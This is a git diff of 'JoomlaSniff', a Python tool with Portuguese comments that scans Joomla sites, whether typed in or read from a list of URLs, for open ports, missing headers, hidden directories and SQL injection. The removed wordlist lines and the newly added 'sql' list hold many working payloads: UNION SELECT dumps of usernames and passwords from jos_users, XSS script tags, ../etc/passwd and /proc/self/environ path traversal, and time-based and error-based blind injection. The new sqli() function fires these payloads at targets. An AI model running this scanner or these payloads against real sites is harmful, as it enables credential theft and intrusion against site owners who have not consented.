@@ -5,6 +5,7 @@ import requests
 import os
 import socket
 import time
+from urllib.parse import urlparse
 
 """
 JoomlaSniff - Ferramenta De Encontrar Falhas Em Sites Joomla
@@ -222,8 +223,6 @@ components/com_bfsurvey_pro/
 components/com_bfsurvey_profree/
 components/com_biblestudy/
 components/com_biblioteca/
-components/com_biblioteca/views/biblioteca/tmpl/pdf.php?pag=1&testo=-a%25' UNION SELECT 1,username,password,4,5,6,7,8,9 FROM jos_users%23
-components/com_biblioteca/views/biblioteca/tmpl/stampa.php?pag=1&testo=-a%25' UNION SELECT 1,username,password,4,5,6,7,8,9 FROM jos_users%23
 components/com_bidding/
 components/com_biitatemplateshop/
 components/com_billyportfolio/
@@ -288,7 +287,6 @@ components/com_ccinvoices/
 components/com_cckjseblod/
 components/com_ccnewsletter/
 components/com_cgtestimonial/
-components/com_cgtestimonial/video.php?url="><script>alert('xss');</script>
 components/com_checklist/
 components/com_chronoconnectivity/
 components/com_chronocontact/
@@ -1382,160 +1380,6 @@ eXtplorer/
 easyblog/entry/uncategorized
 extplorer/
 includes/joomla.php
-index2.php?option=com_joomradio&page=show_video&id=-13+union+select+1,group_concat(username,0x3a,password),3,4,5,6,7+from+jos_users--
-index.php/404'
-index.php/?option=com_question&catID=21' and+1=0 union all
-index.php/image-gallery/"><script>alert('xss')</script>/25-koala
-index.php?file=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd&jat3action=gzip&amp;type=css&v=1
-index.php?option=com_aardvertiser&cat_name=Vehicles'+AND+'1'='1&task=view
-index.php?option=com_aardvertiser&cat_name=conf&task=<=
-index.php?option=com_aardvertiser&task=
-index.php?option=com_abc&view=abc&letter=AS&sectionid='
-index.php?option=com_advert&id=36'
-index.php?option=com_alameda&controller=comments&task=edit&storeid=-1+union+all+select+concat_ws(0x3a,username,password)+from+jos_users--
-index.php?option=com_alfurqan15x&action=viewayat&surano=
-index.php?option=com_amblog&view=amblog&catid=-1 UNION SELECT @@version
-index.php?option=com_annonces&view=edit&Itemid=1
-index.php?option=com_articleman&task=new
-index.php?option=com_bbs&bid=-1
-index.php?option=com_beamospetition&startpage=3&pet=-
-index.php?option=com_beamospetition&startpage=3&pet=-1+Union+select+user()+from+jos_users-
-index.php?option=com_bearleague&task=team&tid=8&sid=1&Itemid=%27
-index.php?option=com_beeheard&controller=../../../../../../../../../../etc/passwd%00
-index.php?option=com_biblioteca&view=biblioteca&testo=-a%25' UNION SELECT 1,username,password,4,5,6,7,8,9 FROM jos_users%23
-index.php?option=com_blogfactory&controller=../../../../../../../../../../etc/passwd%00
-index.php?option=com_bnf&task=listar&action=filter_add&seccion=pago&seccion_id=-1
-index.php?option=com_camelcitydb2&id=-3+union+select+1,2,concat(username,0x3a,password),4,5,6,7,8,9,10,11+from+jos_users--
-index.php?option=com_chronoconnectivity&itemid=1
-index.php?option=com_chronocontact&itemid=1
-index.php?option=com_cinema&Itemid=S@BUN&func=detail&id=
-index.php?option=com_clantools&squad=1+
-index.php?option=com_clantools&task=clanwar&showgame=1+
-index.php?option=com_commedia&format=raw&task=image&pid=4&id=964'
-index.php?option=com_commedia&task=page&commpid=21
-index.php?option=com_connect&view=connect&controller=
-index.php?option=com_content&view=article&id=[A VALID ID]&Itemid=[A VALID ID]&sflaction=dir&sflDir=../../../
-index.php?option=com_delicious&controller=../../../../../../../../../../etc/passwd%00
-index.php?option=com_dioneformwizard&controller=[LFI]%00
-index.php?option=com_discussions&view=thread&catid=[Correct CatID]&thread=-1
-index.php?option=com_dshop&controller=fpage&task=flypage&idofitem=12
-index.php?option=com_easyfaq&Itemid=1&task=view&gid=
-index.php?option=com_easyfaq&catid=1&task=view&id=-2527+
-index.php?option=com_easyfaq&task=view&contact_id=
-index.php?option=com_elite_experts&task=showExpertProfileDetailed&getExpertsFromCountry=&language=ru&id=
-index.php?option=com_equipment&task=components&id=45&sec_men_id=
-index.php?option=com_equipment&view=details&id=
-index.php?option=com_estateagent&Itemid=47&act=object&task=showEO&id=[sqli]
-index.php?option=com_etree&view=displays&layout=category&id=[SQL]
-index.php?option=com_etree&view=displays&layout=user&user_id=[SQL]
-index.php?option=com_ezautos&Itemid=49&id=1&task=helpers&firstCode=1
-index.php?option=com_fabrik&view=table&tableid=13+union+select+1----
-index.php?option=com_filecabinet&task=download&cid[]=7
-index.php?option=com_firmy&task=section_show_set&Id=-1
-index.php?option=com_fss&view=test&prodid=777777.7'+union+all+select+77777777777777%2C77777777777777%2C77777777777777%2Cversion()%2C77777777777777%2C77777777777777%2C77777777777777%2C77777777777777%2C77777777777777%2C77777777777777%2C77777777777777--+D4NB4R
-index.php?option=com_golfcourseguide&view=golfcourses&cid=1&id=
-index.php?option=com_graphics&controller=
-index.php?option=com_grid&gid=15_ok_0',%20'15_ok_0&data_search=
-index.php?option=com_grid&gid=15_ok_0',%20'15_ok_0?data_search=&rpp=
-index.php?option=com_huruhelpdesk&view=detail
-index.php?option=com_huruhelpdesk&view=detail&cid[0]=
-index.php?option=com_huruhelpdesk&view=detail&cid[0]=-1
-index.php?option=com_icagenda&view=list&layout=event&Itemid=520&id=1 and 1=1 
-index.php?option=com_icagenda&view=list&layout=event&Itemid=520&id=1 and 1=2 
-index.php?option=com_icagenda&view=list&layout=event&Itemid=520&id[]=1
-index.php?option=com_iproperty&view=agentproperties&id=
-index.php?option=com_jacomment&view=
-index.php?option=com_jacomment&view=../../../../../../../../../../etc/passwd%00
-index.php?option=com_javoice&view=../../../../../../../../../../../../../../../etc/passwd%00
-index.php?option=com_jcommunity&controller=members&task=1'
-index.php?option=com_jeajaxeventcalendar&view=alleventlist_more&event_id=-13
-index.php?option=com_jefaqpro&view=category&layout=categorylist&catid=2
-index.php?option=com_jefaqpro&view=category&layout=categorylist&task=lists&catid=2
-index.php?option=com_jeguestbook&view=../../../../../../../../etc/passwd%00
-index.php?option=com_jeguestbook&view=item_detail&d_itemid=-1 OR (SELECT(IF(0x41=0x41, BENCHMARK(999999999,NULL),NULL)))
-index.php?option=com_jfuploader&Itemid=
-index.php?option=com_jgen&task=view&id=
-index.php?option=com_jgrid&controller=../../../../../../../../etc/passwd%00
-index.php?option=com_jimtawl&Itemid=12&task=
-index.php?option=com_jmarket&controller=product&task=1'
-index.php?option=com_jobprofile&Itemid=61&task=profilesview&id=1'
-index.php?option=com_jomdirectory&task=search&type=111+
-index.php?option=com_joomdle&view=detail&cat_id=1&course_id=
-index.php?option=com_joomla_flash_uploader&Itemid=1
-index.php?option=com_joomleague&func=showNextMatch&p=[sqli]
-index.php?option=com_joomleague&view=resultsmatrix&p=4&Itemid=[sqli]
-index.php?option=com_joomtouch&controller=
-index.php?option=com_jphone&controller../../../../../../../../../../etc/passwd%00
-index.php?option=com_jphone&controller../../../../../../../../../../proc/self/environ%00
-index.php?option=com_jscalendar&view=jscalendar&task=details&ev_id=999 UNION SELECT 1,username,password,4,5,6,7,8 FROM jos_users
-index.php?option=com_jstore&controller=product-display&task=1'
-index.php?option=com_jsubscription&controller=subscription&task=1'
-index.php?option=com_jtickets&controller=ticket&task=1'
-index.php?option=com_konsultasi&act=detail&sid=
-index.php?option=com_ksadvertiser&Itemid=36&task=add&catid=0&lang=en
-index.php?option=com_kunena&func=userlist&search=
-index.php?option=com_lead&task=display&archive=1&Itemid=65&leadstatus=1'
-index.php?option=com_lovefactory&controller=../../../../../../../../../../etc/passwd%00
-index.php?option=com_markt&page=show_category&catid=7+union+select+0,1,password,3,4,5,username,7,8+from+jos_users--
-index.php?option=com_matamko&controller=
-index.php?option=com_myhome&task=4&nidimmindex.php?option=com_myhome&task=4&nidimm
-index.php?option=com_neorecruit&task=offer_view&id=
-index.php?option=com_newsfeeds&view=categories&feedid=-1%20union%20select%201,concat%28username,char%2858%29,password%29,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30%20from%20jos_users--
-index.php?option=com_noticeboard&controller=
-index.php?option=com_obsuggest&controller=
-index.php?option=com_ongallery&task=ft&id=-1+order+by+1--
-index.php?option=com_ongallery&task=ft&id=-1+union+select+1--
-index.php?option=com_oziogallery&Itemid=
-index.php?option=com_page&id=53
-index.php?option=com_pbbooking&task=validate&id=-1 OR (SELECT(IF(0x41=0x41,BENCHMARK(999999999,NULL),NULL)))
-index.php?option=com_pcchess&controller=../../../../../../../../../../../../../etc/passwd%00
-index.php?option=com_peliculas&view=peliculas&id=null[Sql Injection]
-index.php?option=com_phocagallery&view=categories&Itemid=
-index.php?option=com_photomapgallery&view=imagehandler&folder=-1 OR (SELECT(IF(0x41=0x41,BENCHMARK(9999999999,NULL),NULL)))
-index.php?option=com_php&file=../../../../../../../../../../etc/passwd
-index.php?option=com_php&file=../images/phplogo.jpg
-index.php?option=com_php&file=../js/ie_pngfix.js
-index.php?option=com_ponygallery&Itemid=[sqli]
-index.php?option=com_products&catid=-1
-index.php?option=com_products&id=-1
-index.php?option=com_products&product_id=-1
-index.php?option=com_products&task=category&catid=-1
-index.php?option=com_properties&task=agentlisting&aid=
-index.php?option=com_qcontacts&Itemid=1'
-index.php?option=com_qcontacts?=catid=0&filter_order=[SQLi]&filter_order_Dir=&option=com_qcontacts
-index.php?option=com_record&controller=../../../../../../../../../../etc/passwd%00
-index.php?option=com_restaurantguide&view=country&id='&Itemid=69
-index.php?option=com_rokmodule&tmpl=component&type=raw&module=1'
-index.php?option=com_seyret&view=
-index.php?option=com_simpleshop&Itemid=26&task=viewprod&id=-999.9 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,concat(username,0x3e,password,0x3e,usertype,0x3e,lastvisitdate)+from+jos_users--
-index.php?option=com_smartsite&controller=
-index.php?option=com_spa&view=spa_product&cid=
-index.php?option=com_spidercalendar
-index.php?option=com_spidercalendar&date=1'
-index.php?option=com_spielothek&task=savebattle&bid=-1 OR (SELECT(IF(0x41=0x41,BENCHMARK(9999999999,NULL),NULL)))
-index.php?option=com_spielothek&view=battle&wtbattle=ddbdelete&dbtable=vS&loeschen[0]=-1 OR (SELECT(IF(0x41=0x41,BENCHMARK(9999999999,NULL),NULL)))
-index.php?option=com_spielothek&view=battle&wtbattle=play&bid=-1 OR (SELECT(IF(0x41=0x41,BENCHMARK(9999999999,NULL),NULL)))
-index.php?option=com_staticxt&staticfile=test.php&id=1923
-index.php?option=com_szallasok&mode=8&id=25 (SQL)
-index.php?option=com_tag&task=tag&tag=
-index.php?option=com_timereturns&view=timereturns&id=7+union+all+select+concat_ws(0x3a,username,password),2,3,4,5,6+from+jos_users--
-index.php?option=com_timetrack&view=timetrack&ct_id=-1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,CONCAT(username,0x3A,password) FROM jos_users
-index.php?option=com_ultimateportfolio&controller=
-index.php?option=com_users&view=registration
-index.php?option=com_virtuemart&page=account.index&keyword=[sqli]
-index.php?option=com_worldrates&controller=../../../../../../../../../../etc/passwd%00
-index.php?option=com_x-shop&action=artdetail&idd='
-index.php?option=com_x-shop&action=artdetail&idd='[SQLi]
-index.php?option=com_xcomp&controller=../../[LFI]%00
-index.php?option=com_xvs&controller=../../[LFI]%00
-index.php?option=com_yellowpages&cat=-1923+UNION+SELECT 1,concat_ws(0x3a,username,password),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37+from+jos_users--+Union+select+user()+from+jos_users--
-index.php?option=com_yjcontactus&view=
-index.php?option=com_youtube&id_cate=4
-index.php?option=com_zina&view=zina&Itemid=9
-index.php?option=com_zoomportfolio&view=portfolio&view=portfolio&id=
-index.php?search=NoGe&option=com_esearch&searchId=
-index.php?view=videos&type=member&user_id=-62+union+select+1,2,3,4,5,6,7,8,9,10,11,12,group_concat(username,0x3a,password),14,15,16,17,18,19,20,21,22,23,24,25,26,27+from+jos_users--&option=com_jomtube
-js/index.php?option=com_socialads&view=showad&Itemid=94
 libraries/joomla/utilities/compat/php50x.php
 libraries/pcl/pcltar.php
 libraries/phpmailer/phpmailer.php
@@ -1543,7 +1387,6 @@ libraries/phpxmlrpc/xmlrpcs.php
 modules/mod_artuploader/upload.php");
 modules/mod_as_category.php
 modules/mod_calendar.php
-modules/mod_ccnewsletter/helper/popup.php?id=[SQLi]
 modules/mod_dionefileuploader/upload.php?module_dir=./&module_max=2097152&file_type=application/octet-stream");
 modules/mod_jfancy/script.php");
 modules/mod_ppc_simple_spotlight/elements/upload_file.php
@@ -1556,18 +1399,73 @@ plugins/content/efup_files/helper.php");
 plugins/editors/idoeditor/themes/advanced/php/image.php" method="post" enctype="multipart/form-data">
 plugins/editors/tinymce/jscripts/tiny_mce/plugins/tinybrowser/
 plugins/editors/xstandard/attachmentlibrary.php
-print.php?task=person&id=36 and 1=1
 templates/be2004-2/
 templates/ja_purity/
-wap/wapmain.php?option=onews&action=link&id=-154+union+select+1,2,3,concat(username,0x3a,password),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28+from+jos_users+limit+0,1--
-web/index.php?option=com_rokmodule&tmpl=component&type=raw&module=1'"""
+"""
+
+sql = """
+index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml%27
+index.php?option=com_contenthistory&view=history&list[select]=1
+index.php?option=com_jeux&act=view&Itemid=2&id=-1691+union+all+select+1,2,3,4,5,6,7,8,9,concat(username,char(58),password),11,12,13,14,15,16,17,18+from+jos_users--
+index.php?option=com_vehiclemanager&task=showCategory&catid=1&order_field=(SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7171767071,(SELECT (ELT(1=1,1))),0x716a707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)&order_direction=asc
+index.php?option=com_osgallery&task=showSearchResultAjax&format=raw&textsearch=
+index.php?option=com_simgenealogy&view=latest&type=
+index.php?option=com_phprbridge&view=phpview&id=
+index.php?option=com_lmsking&view=lmsking&layout=learningpath&task=learningPath&cp_id=
+index.php?option=com_registrationpro&view=category&id=
+index.php?option=com_upl&view=propertylisting&sf_selectuser_id=
+index.php?option=com_streetguess&view=maps&catid=
+index.php?option=com_twitchtv&view=...&username=
+index.php?option=com_sponsorwall&task=click&wallid=
+index.php?option=com_focalpoint&view=location&id=
+index.php?option=com_ajaxquiz&view=ajaxquiz&cid=
+index.php?option=com_osdownloads&view=item&id=
+index.php?option=com_pofos&view=pofo&id=
+index.php?option=com_payage&task=make_payment&aid=
+index.php?option=com_joomrecipe&view=all-recipes&category=
+index.php?option=com_jcart&route=product/product&product_id=
+index.php?option=com_extrasearch&establename=
+index.php?option=com_myportfolio&task=project&view=grid&pid=
+index.php?page=shop.product_details&flypage=shop.flypage&product_id=[SQL]&option=com_virtuemart
+index.php?option=com_djartgallery&task=editItem&cid[]=1' and 1=1--+
+index.php?option=com_searchlog&act=log
+component/option,com_jdirectory/task,show_content/contentid,1067/catid,26/directory,1/Itemid,0
+component/osproperty/?task=agent_register
+component/quran/index.php?option=com_quran&action=viewayat&surano=
+components/com_mtree/img/listings/o/{id}.php where {id}
+components/com_sebercart/getPic.php?p=
+index.php?option=com_jabode&task=sign&id=
+index.php?option=com_sportfusion&task=teamdetail&cid[0]=
+index.php?option=com_dhforum&task=grouplist&id=
+index.php?option=com_joomloc&task=edit&id=
+index.php?option=com_netinvoice&task=orders&cid=
+index.php?option=com_jtips&task=ladder&season=
+index.php?option=com_mailto&article=
+index.php?option=com_ninjacentral&task=display&testimID=
+index.php?option=com_regionalm&task=regionalmuseum&id=12&Itemid=139&lang=en
+index.php?option=com_vehiclemanager&task=showCategory&catid=1&order_field=&order_direction=asc
+index.php?option=com_osgallery&task=showSearchResultAjax&format=raw&textsearch=
+index.php?option=com_jctables&format=json&task=getdatarow&tn=users&idx=id&rid=1
+index.php?option=com_youtubegallery&view=youtubegallery&listid=1&themeid=1&yg_api=1&ygsearchquery=
+index.php?option=com_sponsorwall&task=click&wallid=
+index.php?option=com_focalpoint&view=location&id=
+index.php?option=com_ajaxquiz&view=ajaxquiz&cid=
+index.php?option=com_osdownloads&view=item&id=
+index.php?option=com_pofos&view=pofo&id=
+"""
+erros = ["sql syntax", "mysql_fetch", "you have an error", "warning: mysql", "unclosed quotation", "ora-", "postgresql"]
+
 os.system("cls" if os.name == "nt" else "clear")
 banner1 = """
-      _                       _       ____        _  __  __ 
-     | | ___   ___  _ __ ___ | | __ _/ ___| _ __ (_)/ _|/ _|
-  _  | |/ _ \ / _ \| '_ ` _ \| |/ _` \___ \| '_ \| | |_| |_ 
- | |_| | (_) | (_) | | | | | | | (_| |___) | | | | |  _|  _|
-  \___/ \___/ \___/|_| |_| |_|_|\__,_|____/|_| |_|_|_| |_|  
+     ▄█  ▄██████▄   ▄██████▄    ▄▄▄▄███▄▄▄▄    ▄█          ▄████████    ▄████████ ███▄▄▄▄    ▄█     ▄████████    ▄████████ 
+    ███ ███    ███ ███    ███ ▄██▀▀▀███▀▀▀██▄ ███         ███    ███   ███    ███ ███▀▀▀██▄ ███    ███    ███   ███    ███ 
+    ███ ███    ███ ███    ███ ███   ███   ███ ███         ███    ███   ███    █▀  ███   ███ ███▌   ███    █▀    ███    █▀  
+    ███ ███    ███ ███    ███ ███   ███   ███ ███         ███    ███   ███        ███   ███ ███▌  ▄███▄▄▄      ▄███▄▄▄     
+    ███ ███    ███ ███    ███ ███   ███   ███ ███       ▀███████████ ▀███████████ ███   ███ ███▌ ▀▀███▀▀▀     ▀▀███▀▀▀     
+    ███ ███    ███ ███    ███ ███   ███   ███ ███         ███    ███          ███ ███   ███ ███    ███          ███        
+    ███ ███    ███ ███    ███ ███   ███   ███ ███▌    ▄   ███    ███    ▄█    ███ ███   ███ ███    ███          ███        
+█▄ ▄███  ▀██████▀   ▀██████▀   ▀█   ███   █▀  █████▄▄██   ███    █▀   ▄████████▀   ▀█   █▀  █▀     ███          ███        
+▀▀▀▀▀▀                                        ▀                                                                            
 """
 banner = Colorate.Horizontal(Colors.blue_to_white, banner1)
 print(banner)
@@ -1584,16 +1482,19 @@ def portas_abertas(url):
         print(letra, end="", flush=True)
         time.sleep(0.1)
     print()
+    print(f"ALVO {url}")
 
-    url_limpa = url.replace("https://", "").replace("http://", "")
-    url_limpa = url_limpa.rstrip("/")
+    host = urlparse(url).hostname
     portas = [21, 22, 80, 443, 3306, 8080, 25, 110, 143, 445, 3389, 5432, 8443, 27017]
+    if not host:
+        print("URL INVALIDA!")
+        return
 
     for porta in portas:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.settimeout(2)
+        s.settimeout(1)
 
-        resultado = s.connect_ex((url_limpa, porta))
+        resultado = s.connect_ex((host, porta))
         if resultado == 0:
             print(f"{porta} ABERTA")
         s.close()
@@ -1605,13 +1506,16 @@ def requisicao(url):
         print(letra, end="", flush=True)
         time.sleep(0.1)
     print()
-    h = requests.get(url, headers=headers)
+    try:
+        h = requests.get(url, headers=headers, timeout=5)
+    except Exception as e:
+        print(f"ERRO {e}")
+        return
     for chave, valor in h.headers.items():
-            print(f"{chave}: {valor}")
-    print()
-    if chave.lower() == "access-control-allow-origin" and "*" in valor.lower():
+        print(f"{chave}: {valor}")
+        if chave.lower() == "access-control-allow-origin" and "*" in valor.lower():
             print("[FALHA] Permite Requisição de Qualquer Origem!")
-    if chave.lower() == "access-control-allow-credentials" and "true" in valor.lower():
+        if chave.lower() == "access-control-allow-credentials" and "true" in valor.lower():
             print("[FALHA] Permite que Credenciais Sejam Enviadas Entre as Requisição!")
     if "content-security-policy" not in h.headers:
             print("[FALTA] Falta de Content-Security-Policy")
@@ -1624,47 +1528,70 @@ def requisicao(url):
     if "referrer-policy" not in h.headers:
             print("[FALTA] Falta de Referrer-Policy")
     print()
-def ip(url):
-    frase = "Pegando o Ip do Alvo..."
-    for letra in frase:
-        print(letra, end="", flush=True)
-        time.sleep(0.1)
-    print()
-    print("ALVO:", url)
-    print()
-    url_limpa = url.replace("https://", "").replace("http://", "")
-    url_limpa = url_limpa.rstrip("/")
-    ip = socket.gethostbyname(url_limpa)
-    print()
-    print(ip)
-    print()
 def wordlis(url):
     frase = "Encontrando Diretorios Ocultos..."
     for letra in frase:
         print(letra, end="", flush=True)
         time.sleep(0.1)
     print()
+    if not url.endswith ("/"):
+        url += "/"
     for word in wordlist.strip().splitlines():
-        p = requests.get(f"{url}{word}", headers=headers)
+        try:
+            p = requests.get(f"{url}{word}", headers=headers, timeout=3)
+        except Exception as e:
+            print(f"ERRO: {e}")
+            continue
         if p.status_code == 200:
             print(f"ENCONTRADO: {url}{word}")
+        if p.status_code == 403:
+            print(f"ENCONTRADO/POREM ERRO 403: {url}{word}")
+        if p.status_code == 429:
+            print("[ERRO] 429 Too Many Requests")
+            break
     print()
+
+def sqli(url):
+    frase = "Testando Payloads de SQL Injection..."
+    for letra in frase:
+        print(letra, end="", flush=True)
+        time.sleep(0.1)
+    print()
+    for sqls in sql.strip().splitlines():
+        url_limpaa = url.rstrip("/")
+        try:
+            s = requests.get(f"{url_limpaa}/{sqls}", headers=headers, timeout=5)
+        except Exception as a:
+            print(f"ERRO: {a}")
+            continue
+        texto = s.text.lower()
+        achou = False
+        for erro in erros:
+            if erro in texto:
+                print(f"SQL INJECTION ENCONTRADO: {url_limpaa}/{sqls}")
+                achou = True
+                break
+        if not achou and s.status_code == 500:
+            print(f"POSSIVEL SQLI: {url_limpaa}/{sqls}")
+        time.sleep(0.5)
 
 while True:
     print("A URL TEM QUE TER / NO FINAL!")
     print("A LISTA (urls.txt) NO MESMO LUGAR DO SCRIPT PARA FUNCIONAR!")
     print()
+    print("[0] SAIR")
     print("[1] DIGITAR URL")
     print("[2] LISTA DE URLS (urls.txt)")
     print()
     escolha = input ("ESCOLHA: ")
     if escolha == "1":
         url = input("URL: ")
-        ip(url)
         print()
         portas_abertas(url)
         print()
         requisicao(url)
+        print()
+        sqli(url)
         print()
         wordlis(url)
     elif escolha == "2":
@@ -1672,13 +1599,16 @@ while True:
             for url in f:
                 url = url.strip()
                 if url:
-                    ip(url)
                     print()
                     portas_abertas(url)
                     print()
                     requisicao(url)
                     print()
+                    sqli(url)
+                    print()
                     wordlis(url)
+    elif escolha == "0":
+        break
 
 
 
